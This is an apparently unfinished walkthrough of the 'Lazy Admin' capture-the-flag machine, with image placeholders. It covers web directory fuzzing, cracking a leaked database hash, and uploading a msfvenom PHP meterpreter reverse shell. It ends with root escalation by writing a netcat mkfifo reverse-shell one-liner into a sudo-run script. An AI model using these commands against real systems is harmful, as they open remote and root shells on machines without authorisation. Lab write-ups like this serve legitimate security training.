# Lazy Admin

## Reconnaissance
Let's start the enumeration with scanning the ports, which we can do with nmap. This can be done with the command nmap -A -T4 <ip>.

<insert image>

As we can see there are two ports open, port 22 for ssh and port 80 for http. The SSH version running is OpenSSH 7.2p2 and the server is an Apache server running on ubuntu. For further enumeration we can use ffuf with the command ```ffuf -w /usr/share/wordlists/dirb/big.txt -u "http://<ip>/FUZZ"```.

<insert image>

```/content``` seems interesting, so let's check it out. Hmm, that did not give us much.

<insert image>

Let's try fuzzing even deeper, we can do this with the command ```ffuf -w /usr/share/wordlists/dirb/big.txt -u "http://<ip>/content/FUZZ"```

<insert image>


/as seems interesting, so lets check it out, oh an admin panel. We could try to brute-force it, but let's continue searching to see if we can find something interesting.

<insert image>

We can find an backup of an mysql database at ````<ip>/content/inc/mysql_backup```, lets try downloading it and opening it.

<insert image>

Here we can find both a username and an hashed password, maybe if we can crack the password we can use it to login to the admin panel.

<insert image>

I used ```https://crackstation.net/``` to crack the password.

<insert image>

Now we can log in to the admin panel. 

<insert image>

## Getting a shell
Now that we have gotten into the admin panel, it's time to look for a way to get a shell. After looking around on the admin panel for a litte while I found an upload button, lets see if we can upload a reverse shell through the upload form. 

<insert image>

We can create an reverse shell with the command msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.php. That worked. Now we can go to ```<ip>/content/attachment/shell.php5``` and run the file while we try to catch the reverse shell. We can catch the reverse shell with metasploit (msfconsole). I used the payload php/meterpreter_reverse_tcp. Set the options LHOST <your ip> and LPORT <choosen port>.

<insert image>

## Privilege Escalation
Now that we have gotten into the computer it's time for privilege escalation, so let's do some enumeration. sudo -l shows us that we can use ```/user/bin/perl /home/itguy/backup.pl``` as root.

<insert image>

Let's check out the ```/home/itguy/backup.pl`` file.

<insert image>

Ok, now lets check out the ```/etc/copy.sh``` file.

<insert image>

It seems like most of the job is done for us. Let's change tha ip to our ip. We can do this with ```echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your_ip> 5554 >/tmp/f" > /etc/copy.sh```


We can now try to catch it with netcat on our computer with ```nc -nvlp 5554``` and then run the file with ```sudo /usr/bin/perl /home/itguy/backup.pl```

<insert image>

That worked, we have now root access on the machine.